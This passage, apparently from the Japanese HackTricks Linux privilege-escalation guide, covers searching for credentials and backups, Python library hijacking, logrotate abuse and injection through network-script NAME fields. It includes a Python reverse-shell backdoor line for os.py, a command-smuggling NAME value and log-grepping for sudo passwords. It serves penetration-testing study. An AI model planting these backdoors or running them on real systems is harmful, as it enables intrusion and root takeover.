以下のフォルダにはバックアップや有用な情報が含まれている可能性があります： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （最後のものはおそらく読めないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のScript/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを確認してください。これはパスワードを含んでいる可能性のある**複数のファイルを検索**します。\
**もう一つの興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは Windows、Linux & Mac のローカルコンピュータに保存された大量のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**興味深い／機密情報が含まれている可能性があります**。ログが奇妙であるほど、より興味深い内容が見つかる可能性が高いです（おそらく）。\
また、**不正に**設定された（バックドア入り？）**監査ログ**では、この投稿で説明されているように、監査ログ内に**パスワードを記録**できる場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、グループ [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に "**password**" という単語が含まれているファイルを確認し、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックするべきです。\
ここでこれらをすべて行う方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最終チェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし **どこから** python スクリプトが実行されるかが分かっていて、そのフォルダに **書き込みできる** か、あるいは **python libraries を変更できる** なら、OS ライブラリを改変して backdoor を仕込むことができます（python スクリプトが実行される場所に書き込み可能なら、os.py ライブラリをコピーして貼り付けてください）。

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **write permissions** を持つユーザーが権限昇格する可能性があります。これは `logrotate` が多くの場合 **root** として動作し、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。権限の確認は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで行うことが重要です。

> [!TIP]
> この脆弱性は `logrotate` の `3.18.0` 以前のバージョンに影響します

脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に類似しているため、ログを変更できることが分かった場合は、それらのログを誰が管理しているかを確認し、ログを symlinks に置き換えて権限昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **write** できる、または既存のものを **adjust** できる場合、**system is pwned** です。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルと同じです。しかし、Linux 上では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私のケースでは、これらの network scripts 内の `NAME=` 属性が正しく処理されていません。**名前に white/blank space が含まれていると、システムはその空白の後の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（_Network と /bin/id_ の間の空白に注意_）

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) のための **スクリプト** が置かれる場所です。これは **古典的な Linux サービス管理システム** で、サービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトを含みます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で `/etc/init` は **Upstart** に関連付けられており、Ubuntu が導入した新しい **サービス管理** で、設定ファイルを使ってサービス管理を行います。Upstart への移行があっても、互換性レイヤにより SysVinit スクリプトは Upstart の設定と併用されます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ向けに `/usr/lib/systemd/`、管理者による変更向けに `/etc/systemd/system/` に整理され、システム管理を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting フレームワークは一般的に syscall をフックして特権のある kernel 機能を userspace の manager に公開します。マネージャの認証が弱い場合（例：FD-order に基づく署名チェックや脆弱なパスワード方式）には、ローカルアプリがマネージャになりすまして、既に root 化されたデバイス上で root にエスカレーションできる可能性があります。詳細とエクスプロイトは次を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v オプション付きで実行する可能性があります。許容度の高いパターン（例：\S の使用）は、書き込み可能な場所（例：/tmp/httpd）に配置した攻撃者制御のリスナーにマッチし、root として実行される（CWE-426 Untrusted Search Path）恐れがあります。

詳細および他の discovery/monitoring スタックにも適用できる一般化パターンは次を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux のローカル権限昇格ベクターを探すための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** カーネルの脆弱性を Linux と MAC で列挙する [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
